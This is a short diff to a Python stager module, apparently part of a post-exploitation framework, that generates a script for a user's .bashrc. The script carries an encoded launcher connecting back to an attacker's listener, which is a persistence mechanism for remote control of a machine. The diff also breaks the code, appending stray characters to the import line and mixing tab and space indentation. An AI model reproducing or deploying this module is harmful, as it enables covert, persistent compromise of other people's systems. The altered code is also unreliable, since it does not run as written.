@@ -1,5 +1,4 @@
-from lib.common import helpers
-
+from lib.common import helpers;'][]'
 
 class Stager:
 
@@ -13,14 +12,14 @@ class Stager:
             'Description': ('Generate Script in file .bashrc.'),
 
             'Comments': [
-                ''
+                'https://twitter.com/homjxi0e'
             ]
         }
 
-         
+
         self.options = {
-             
-             
+
+
             'Listener' : {
                 'Description'   :   'Listener to generate stager for.',
                 'Required'      :   True,
@@ -48,26 +47,26 @@ class Stager:
             }
         }
 
-         
-         
+
+
         self.mainMenu = mainMenu
 
         for param in params:
-        
+
             option, value = param
             if option in self.options:
                 self.options[option]['Value'] = value
 
     def generate(self):
 
-       
+
         language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
-	OutFile = self.options['OutFile']['Value']
 
-        
+
+
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)
 
         if launcher == "":
@@ -75,6 +74,8 @@ class Stager:
             return ""
 
         else:
-            script = "#!/bin/bash\n"
-            script += "%s\n" %(launcher)
+	    script = "#Matt homjxi0e\n"
+
+	    script += "%s\n" %(launcher)
+
             return script
